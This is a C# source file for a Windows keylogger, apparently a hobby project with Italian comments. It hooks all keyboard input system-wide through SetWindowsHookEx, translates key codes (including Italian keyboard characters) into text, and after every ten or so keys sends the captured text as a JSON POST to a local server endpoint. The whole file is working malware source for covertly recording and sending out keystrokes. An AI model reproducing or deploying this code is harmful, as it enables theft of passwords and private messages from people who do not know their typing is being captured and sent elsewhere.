using static System.Net.Mime.MediaTypeNames;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;


namespace keylogger
{
    internal class Program
    {
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        private static readonly HttpClient client = new HttpClient();

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x100;
        private static int WM_SYSKEYDOWN = 0x104;

        public static void Main(string[] args)
        {
            HookCallbackDelegate hcDelegate = HookCallback;

            string mainModuleName = Process.GetCurrentProcess().MainModule.ModuleName;
            IntPtr hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);

            System.Windows.Forms.Application.Run();

        }

        private static int wordCounter = 0;
        private static string actualString = "";
        private static Dictionary<string, string> dizionario = new Dictionary<string, string>
        {
            {"D0", "0"},
            {"D1", "1"},
            {"D2", "2"},
            {"D3", "3"},
            {"D4", "4"},
            {"D5", "5"},
            {"D6", "6"},
            {"D7", "7"},
            {"D8", "8"},
            {"D9", "9"},
            {"Enter", "\n"},
            {"Space", " "},
            {"Back", "[Back]" },
            {"Oem4", "'" },
            {"Oem6", "ì" },
            {"OemSemicolon", "è" },
            {"Oemplus", "+" },
            {"Oem3", "ò" },
            {"Oem7", "à" },
            {"Oem2", "ù" },
            {"Oemcomma", "," },
            {"OemPeriod", "." },
            {"OemMinus", "-" }
        };

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            
            if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.Write($"[{(Keys)vkCode}]");
                if (wordCounter > 10)
                {
                    saveLog();
                    wordCounter = 0;
                    actualString = "";
                }
                InsertKey(vkCode);
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static void saveLog()
        {
            var jsonData = new
            {
                title = "latest read",
                text = actualString
            };

            string url = "http://127.0.0.1:5000/file";

            using (WebClient client = new WebClient())
            {
                client.Headers[HttpRequestHeader.ContentType] = "application/json";

                // Converti l'oggetto JSON in una stringa
                string jsonString = Newtonsoft.Json.JsonConvert.SerializeObject(jsonData);

                // Invia la richiesta POST
                string response = client.UploadString(url, "POST", jsonString);

                // Stampa la risposta del server
                Console.WriteLine("Risposta del server:");
                Console.WriteLine(response);
            }
        }

        private static void InsertKey(int vkCode)
        {
            if (dizionario.ContainsKey($"{(Keys)vkCode}"))
                actualString += dizionario[$"{(Keys)vkCode}"];
            else
                actualString += $"{(Keys)vkCode}";

            wordCounter++;
        }

        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);

    }
}
